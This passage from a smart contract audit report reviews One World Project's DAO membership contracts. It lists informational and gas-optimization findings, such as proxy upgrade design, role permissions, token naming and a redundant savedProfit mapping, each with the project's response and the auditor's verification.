**Description:** Currently, new membership DAOs are deployed as [Transparent upgradeable proxies](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L66-L70), managed by a [single instance](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L40) of `ProxyAdmin` [exposed](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L155-L163) to the privileged `EXTERNAL_CALLER` role. Assuming that the intention is to upgrade all DAO proxies in the event the `MembershipERC1155` implementation requires updating, it will be cumbersome to iterate through each contract to perform the upgrade. The [Beacon proxy pattern](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/beacon/BeaconProxy.sol) is better-suited to performing this type of global implementation upgrade for all managed proxies and thus recommended over the existing design.

**One World Project:** The Upgrades will be choices for each DAO separately. So kept as it is.

**Cyfrin:** Acknowledged.


### DAO creators cannot freely update membership configuration

**Description:** While `MembershipFactory::updateDAOMembership` is intended to update the tier configurations for a specific DAO, this function can only be called by the [permissioned](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L95) `EXTERNAL_CALLER` role. As such, DAO creators cannot freely update membership configuration without coordination of the `EXTERNAL_CALLER` role.

**Recommended Mitigation:** Allow DAO creators to freely update the membership configuration for their DAOs.

**One World Project:** DAO creators are not supposed to have that access directly.

**Cyfrin:** Acknowledged.


### EIP-712 name and project symbol are misaligned

**Description:** The [symbol](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L69) used for the `MembershipERC1155` token is `1WP`; however, `OWP` is used in the EIP-712 [name declaration](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/meta-transaction/NativeMetaTransaction.sol#L31).

This misalignment could be confusing for users signing messages thinking they are going to use `1WP` as the name. Consider using the same name as symbol, or vice versa.

**One World Project:** Made it OWP in [`ba3603a`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/ba3603ad8c4d976bdf1fa76ea3fb91e8ea1d4462).

**Cyfrin:** Verified. Token symbol is now `OWP`.


### `OWPIdentity` token lacks a `name` and `symbol`

**Description:** While `name` and `symbol` are not mandatory in the ERC-1155 specification, they are often used to identify the token; however, the [`OWPIdentity`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/OWPIdentity.sol) contract does not declare these.

**Recommended Mitigation:** Consider adding a `name` and `symbol` for easier identification.

**One World Project:** Added in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. `name` and `symbol` are added as `public`.


### DAOs can be created with non-zero `TierConfig::minted`

**Description:** When creating a new DAO membership, there is no validation on the `minted` member of the parallel `TierConfig` structs, meaning that DAOs can be created with non-zero minted tokens even when the supply for a given tier index is actually zero.

**Recommended Mitigation:** Consider enforcing that tier configuration minted states should begin empty.

**One World Project:** Added check in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. Check added when pushing the tiers to `dao.tiers`.


### `MembershipFactory::joinDAO` will not function correctly with fee-on-transfer tokens

**Description:** While it is understood that the protocol does not intend to support fee-on-transfer tokens, it is prescient to note that `MembershipFactory::joinDAO` will [not function correctly](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L129-L130) if tokens of this type are ever added to the `CurrencyManager`:

```solidity
IERC20(daos[daoMembershipAddress].currency).transferFrom(msg.sender, owpWallet, platformFees);
IERC20(daos[daoMembershipAddress].currency).transferFrom(msg.sender, daoMembershipAddress, tierPrice - platformFees);
```

Here, the actual number of tokens received by `owpWallet` and `daoMembershipAddress` will be less than expected.

**One World Project:** Acknowledged. Fee on transfer tokens are not supported.

**Cyfrin:** Acknowledged.


### Constants should be used in place of magic numbers

**Description:** There are a number of instances in both `MembershipFactory` [[1](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L60), [2](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L63
), [3](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L97)] and `MembershipERC1155` [[1](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L58), [2](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L71), [3](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L77), [4](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L92), [5](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L168-L175)] where magic numbers are used inline within functions – these should be replaced by constant variables for better readability, to avoid repetition, and to reduce the likelihood of error.

**One World Project:** Added constants at some places where repetitive usage in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. However only the suggested changes in `MembershipFactory` were implemented, not in `MembershipERC1155`.

\clearpage
## Gas Optimization


### The `savedProfit` mapping will always return zero

**Description:** When a DAO member calls [`MembershipERC1155::claimProfit`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L138-L147), their current profit is calculated in []([`MembershipERC1155::saveProfit`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L178-187):)

```solidity
function saveProfit(address account, address currency) internal returns (uint profit) {
    uint unsaved = getUnsaved(account, currency);
    lastProfit[account][currency] = totalProfit[currency];
    profit = savedProfit[account][currency] + unsaved;
    savedProfit[account][currency] = profit;
}
```

Here, `savedProfit` is incremented by the calculated unsaved profit. The profit is then paid in `MembershipERC1155::claimProfit` after resetting `savedProfit` to zero:

```solidity
function claimProfit(address currency) external returns (uint profit) {
    profit = saveProfit(msg.sender, currency);
    require(profit > 0, "No profit available");
    savedProfit[msg.sender][currency] = 0;
    IERC20(currency).safeTransfer(msg.sender, profit);
    emit Claim(msg.sender, profit);
}
```

Since `savedProfit` is reset to zero within the lifetime of the same call in which it is initialized, the mapping will always return `0` for a given currency/member pair. Thus, usage in the `savedProfit[account][currency] + unsaved` [expression](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L185) is redundant, meaning the value stored in `savedProfit` is never used and can be safely removed.

**Recommended Mitigation:** Consider removing `savedProfit`.

**One World Project:** Updated usage for savedProfit mapping in [`a3980c1`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/a3980c17217a0b65ecbd28eb078d4d94b4bd5b80)

**Cyfrin:** Closed. `savedProfit` now used.

\clearpage